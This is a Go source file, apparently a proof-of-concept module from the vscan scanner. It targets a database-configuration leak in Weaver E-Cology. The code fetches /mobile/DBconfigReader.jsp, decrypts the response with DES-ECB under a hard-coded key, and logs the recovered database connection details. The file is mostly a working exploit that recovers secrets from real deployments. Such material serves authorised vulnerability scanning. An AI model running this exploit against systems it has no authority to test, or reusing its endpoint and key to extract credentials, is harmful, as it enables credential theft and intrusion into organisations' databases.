package weaver

import (
	"bytes"
	"crypto/cipher"
	"crypto/des"
	"encoding/base64"
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

func NewECBDecrypter(block cipher.Block) cipher.BlockMode {
	return &ecbDecrypter{block}
}

type ecbDecrypter struct {
	block cipher.Block
}

func (x *ecbDecrypter) BlockSize() int { return x.block.BlockSize() }

func (x *ecbDecrypter) CryptBlocks(dst, src []byte) {
	if len(src)%x.block.BlockSize() != 0 {
		panic("crypto/cipher: input not full blocks")
	}
	if len(dst) < len(src) {
		panic("crypto/cipher: output smaller than input")
	}
	for len(src) > 0 {
		x.block.Decrypt(dst[:x.block.BlockSize()], src[:x.block.BlockSize()])
		src = src[x.block.BlockSize():]
		dst = dst[x.block.BlockSize():]
	}
}

// ZeroPadding 填充
type ZeroPadding struct{}

func NewZeroPadding() *ZeroPadding {
	return &ZeroPadding{}
}

func (p *ZeroPadding) Pad(src []byte, blockSize int) []byte {
	padding := blockSize - len(src)%blockSize
	padtext := bytes.Repeat([]byte{byte(0)}, padding)
	return append(src, padtext...)
}
func (p *ZeroPadding) Unpad(src []byte) ([]byte, error) {
	length := len(src)
	unpadding := int(src[length-1])
	if unpadding > length {
		return nil, fmt.Errorf("Invalid padding size %d\n", unpadding)
	}
	return src[:(length - unpadding)], nil
}
func E_Cology_Database_Leak(u string) bool {

	header := make(map[string]string)
	header["Content-Type"] = "application/x-www-form-urlencoded"
	header["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
	header["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
	if req, err := pkg.HttpRequset(u+"/mobile/DBconfigReader.jsp", "GET", "", false, header); err == nil {

		if req.StatusCode == 200 {
			body := req.Body
			s := bytes.Replace([]byte(body), []byte("\r\n"), []byte(""), -1)

			ciphertext := base64.StdEncoding.EncodeToString(s)
			key := []byte("1z2x3c4v")
			block, err := des.NewCipher(key) // 创建 DES 加密块
			if err != nil {
				fmt.Println(err)
			}
			mode := NewECBDecrypter(block)
			// 创建 ECB 解密器，不需要 IV 向量
			padding := NewZeroPadding() // ZeroPadding 填充

			// 对密文进行 Base64 解码
			ciphertextBytes, err := base64.StdEncoding.DecodeString(ciphertext)
			if err != nil {
				fmt.Println(err)
			}

			// 解密密文
			mode.CryptBlocks(ciphertextBytes, ciphertextBytes)

			// 去除填充字符
			plaintextBytes, err := padding.Unpad(ciphertextBytes)
			if err != nil {
				fmt.Println(err)
			}

			// 将解密后的明文转换为字符串
			plaintext := string(plaintextBytes)
			if strings.Contains(plaintext, "DatabaseName") {
				pkg.GoPocLog(fmt.Sprintf("Found vuln E_Cology_数据库信息泄露|%s\n", plaintext))
				return true
			}
			//pkg.GoPocLog(fmt.Sprintf("正则匹配内容:%s,长度为：%d\n", resourceUuid, len(resourceUuid)))

		}
	}
	return false
}
